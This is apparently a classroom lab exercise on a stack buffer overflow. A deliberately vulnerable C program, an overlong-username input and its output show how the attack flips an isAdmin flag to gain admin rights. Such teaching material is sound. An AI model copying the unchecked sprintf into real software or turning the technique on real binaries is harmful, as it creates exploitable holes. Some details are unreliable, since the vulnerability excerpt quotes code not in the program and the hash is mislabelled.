# Simple Buffer overflow

## Intro

We will perform a simple buffer overflow on a binary. This overflow
will change the function flow, which enables us to gain "admin" privileges.


## Goal

* Understand C arrays by misusing them
* Get comfortable with gdb
* Deeper understanding of the stack


## Vulnerable program

We have the following program:

challenge09.c:
```c
#include <stdio.h>
#include <stdlib.h>
#include <crypt.h>
#include <string.h>

/* hash of: "ourteacheristehbest" */
const char *adminHash = "$6$saaaaalty$cjw9qyAKmchl7kQMJxE5c1mHN0cXxfQNjs4EhcyULLndQR1wXslGCaZrJj5xRRBeflfvmpoIVv6Vs7ZOQwhcx.";


int checkPassword(char *password) {
    char *hash;

    /* $6$ is SHA256 */
    hash = crypt(password, "$6$saaaaalty");

    if (strcmp(hash, adminHash) == 0) {
        return 1;
    } else {
        return 0;
    }
}


void handleData(char *username, char *password) {
    int isAdmin = 0;
    char name[64]; // should be enough for all usernames

    // Check if user has admin privileges
    isAdmin = checkPassword(password);

    // create internal username
    sprintf(name, "%s-%s", "cmd", username);

    if(isAdmin > 0) {
        printf("Hello %s.\nYou are admin!\nisAdmin: 0x%x\n", name, isAdmin);
    } else {
        printf("Hello %s.\nYou are not admin.\nisAdmin: 0x%x\n", name, isAdmin);
    }
}


int main(int argc, char **argv) {
    if (argc != 3) {
        printf("Call: %s <name> <password>\n", argv[0]);
        exit(0);
    }

    handleData(argv[1], argv[2]);
}
```

You can compile it by calling `make` in the folder `~/challenges/challenge09`


## Vulnerability

The vulnerability lies here:

```
void handleData(char *username, char *password) {
    int isAdmin = 0;
    char name[64]; // should be enough for all usernames
	[...]
	strcpy(firstname, username);
	[...]
}


int main(int argc, char **argv) {
	[...]
    sprintf(name, "%s-%s", "cmd", username);
}
```

The second argument of the program is copied into a stack buffer `name` of 64 byte size.
After this buffer `name`, an important variable called `isAdmin` is located.


## Normal behaviour

Lets execute the program with normal length string, and with a wrong password:

```
root@hlUbuntu32aslr:~/challenges/challenge09# ./challenge09 sheldon test
Hello cmd-sheldon.
You are not admin.
isAdmin: 0x0
```

The password "test" seems to be not correct, as the program tells us "You are not admin".


Lets execute it with the correct password `ourteacheristehbest`:
```
root@hlUbuntu32aslr:~/challenges/challenge09# ./challenge09 sheldon ourteacheristehbest
Hello cmd-sheldon.
You are admin!
isAdmin: 0x1
```

With the correct password, a message will be printed indicating that the user "cmd-sheldon"
has admin privileges.

## Abnormal behaviour - overflow

What happens when you insert a string which is longer than 64 bytes? Lets try it.
We can use python to print 70 characters:

```
root@hlUbuntu32aslr:~/challenges/challenge09# ./challenge09 `python -c 'print "A"*70'` test
Hello cmd-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.
You are admin!
isAdmin: 0x41414141
```

## Abnormal behaviour - more overflow

What if we even add some more characters? Lets say 100.

```
root@hlUbuntu32aslr:~/challenges/challenge09# ./challenge09 `python -c 'print "A"*100'` test
Hello cmd-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.
You are admin!
isAdmin: 0x41414141
Segmentation fault (core dumped)
```


## Questions

* What is happening here? Why Are we "admin" if we use a username which is 70 bytes long?
* Why does it crash, if we use a username which is 100 bytes long?
